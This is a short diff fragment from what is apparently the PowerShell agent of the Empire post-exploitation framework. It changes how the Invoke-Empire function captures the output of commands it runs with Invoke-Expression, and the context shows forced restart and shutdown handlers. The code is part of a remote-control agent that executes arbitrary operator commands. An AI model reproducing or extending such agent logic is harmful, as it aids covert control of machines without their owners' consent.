@@ -410,8 +410,8 @@ function Invoke-Empire {
                 '(reboot|restart)' { Restart-Computer -force }
                 shutdown { Stop-Computer -force }
                 default {
-                    if ($cmdargs.length -eq '') { $output = IEX $cmd }
-                    else { $output = IEX "$cmd $cmdargs" }
+                    if ($cmdargs.length -eq '') { $output = IEX $cmd | Out-String }
+                    else { $output = IEX "$cmd $cmdargs" | Out-String }
                 }
             }
         }
